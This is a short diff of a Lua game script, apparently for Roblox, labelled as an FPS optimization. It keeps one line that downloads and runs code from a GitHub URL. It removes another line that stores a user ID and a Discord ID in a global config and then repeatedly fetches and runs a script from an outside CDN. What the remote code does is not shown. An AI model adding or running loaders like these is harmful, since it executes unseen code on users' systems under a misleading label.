@@ -563,7 +563,6 @@ end)
 
 print("[Optimization] FPS limiter loop started")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/super-boost-fps/sucvat/main/ditfps-bf.lua"))()
-_G.Config={UserID="badd2600-4075-4633-9308-00864deb0151",discord_id="1147664930984693840",Note="RS"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/sab"))()end)if s then break end wait(5)end
 
 
 print("started")
